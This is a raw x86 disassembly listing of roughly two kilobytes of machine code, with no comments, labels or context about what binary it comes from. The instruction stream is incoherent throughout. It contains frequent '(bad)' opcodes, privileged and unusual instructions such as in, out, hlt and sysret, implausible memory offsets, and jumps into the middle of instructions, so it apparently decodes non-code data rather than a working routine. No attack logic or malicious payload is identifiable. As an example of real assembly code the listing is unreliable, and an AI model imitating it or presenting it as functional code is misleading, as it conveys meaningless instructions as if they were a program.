  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
